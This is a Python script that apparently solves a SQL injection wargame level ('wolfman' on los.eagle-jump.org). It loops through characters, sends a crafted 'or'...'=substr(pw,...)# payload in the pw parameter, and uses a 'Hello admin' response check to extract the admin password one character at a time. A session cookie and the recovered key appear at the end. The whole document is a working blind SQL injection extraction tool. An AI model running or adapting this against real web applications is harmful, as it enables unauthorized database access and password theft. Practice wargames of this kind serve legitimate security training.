#!/usr/local/bin/python3

import urllib.request
from urllib.parse import quote
import time

key = ""
for i in range(1, 40):
    for j in range(32, 127):
        url = "http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw="
        data = "'or'{}'=substr(pw,1,{})#".format(key + chr(j), str(i))
        data = quote(data)
        re = urllib.request.Request(url+data)
        re.add_header("User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=pdah5igtkcp024tlbfueevv8b0")
        re.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        req = urllib.request.urlopen(re)

        print(re)
        if str(req.read()).find("Hello admin") != -1:
            key += chr(j)
            print (key)
            break
print (key)

# 4F63E9729A37812CC5B14
